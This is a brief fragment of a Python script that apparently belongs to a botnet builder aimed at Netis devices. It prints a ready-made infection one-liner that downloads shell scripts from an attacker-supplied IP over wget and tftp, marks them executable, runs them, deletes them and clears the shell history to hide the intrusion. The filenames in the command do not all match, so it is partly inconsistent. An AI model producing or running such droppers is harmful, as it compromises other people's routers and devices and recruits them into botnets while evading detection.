...
print("\x1b[0;32mCOMPILED TO DEFINE NETIS\x1b[0m")
print("\x1b[0;32mYour link: cd /tmp; wget http://" + ip + "/salviaw5.sh;chmod 777 salviaw.sh;sh salviaw.sh;tftp " + ip + " -c get salviat5.sh;chmod 777 salviat5.sh;sh salviat5.sh;rm -rf salviaw5.sh salviat5.sh;history -c\x1b[0m")